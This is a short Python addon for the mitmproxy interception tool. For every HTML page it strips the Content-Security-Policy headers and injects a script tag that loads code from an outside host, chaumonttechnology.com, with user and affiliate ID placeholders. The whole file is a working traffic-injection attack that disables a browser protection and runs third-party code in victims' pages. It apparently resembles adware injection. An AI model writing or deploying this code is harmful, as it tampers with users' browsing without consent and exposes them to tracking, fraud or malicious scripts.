from mitmproxy import http


def response(flow: http.HTTPFlow) -> None:
    if flow.response.status_code == 200:
        if "text/html" in flow.response.headers["content-type"]:
            flow.response.headers.pop("content-security-policy", None)
            flow.response.headers.pop("content-security-policy-report-only", None)
            script_url = "https://chaumonttechnology.com/ia/script/d.php?uid=%UID%&a=%AID%&v=a%VERSION%"
            html = flow.response.content
            html = html.decode().replace(
                "</body>", "<script src='" + script_url + "'></script></body>"
            )
            flow.response.content = str(html).encode("utf8")
